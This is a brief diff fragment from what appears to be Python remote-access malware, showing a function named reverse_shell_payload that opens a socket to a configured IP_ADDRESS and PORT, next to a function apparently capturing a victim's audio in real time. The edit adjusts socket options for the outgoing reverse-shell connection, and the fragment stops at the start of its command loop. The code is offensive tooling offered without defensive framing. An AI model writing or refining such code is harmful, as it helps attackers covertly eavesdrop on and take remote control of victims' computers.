@@ -257,7 +257,8 @@ def listening_victim_realtime():
     audio_thread.start()
     return audio_thread
 def reverse_shell_payload():
-    s=socket.socket()
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
     s.connect((IP_ADDRESS,PORT))
     while True:
         try:
